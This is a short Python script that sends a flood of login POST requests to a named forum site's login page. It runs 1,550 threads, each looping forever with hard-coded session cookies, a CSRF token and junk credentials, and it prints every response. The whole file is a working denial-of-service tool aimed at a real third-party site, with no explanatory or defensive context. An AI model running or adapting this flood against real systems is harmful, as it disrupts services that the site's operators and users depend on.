import requests
import threading


cookies = {
    'xf_csrf': 'EpbBAEQkLQqW7auT',
    'xf_session': 'DCJ7sLXQo6tUfK0FWTam-lmmSB0ojiOJ',
}

headers = {
    'authority': 'hacksturkey.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'accept-language': 'tr-TR;q=0.5',
    'cache-control': 'max-age=0',
    # Requests sorts cookies= alphabetically
    'cookie': 'xf_csrf=EpbBAEQkLQqW7auT; xf_session=DCJ7sLXQo6tUfK0FWTam-lmmSB0ojiOJ',
    'origin': 'https://hacksturkey.com',
    'referer': 'https://hacksturkey.com/giris/login',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'sec-gpc': '1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36',
}

data = {
    '_xfToken': '1659565661,1cd6d456144a5f5f975a247e4b2914f1',
    'login': 'asasdasdasdsa',
    'password': 'asdsadsad',
    'remember': '1',
    '_xfRedirect': 'https://hacksturkey.com/',
}

def script():
    while True:
        response = requests.post('https://hacksturkey.com/giris/login', cookies=cookies, headers=headers, data=data).text

        print(response)
threads = []

for i in range(1550):
    t = threading.Thread(target=script)
    t.daemon = True
    threads.append(t)

for i in range(1550):
    threads[i].start()

for i in range(1550):
    threads[i].join()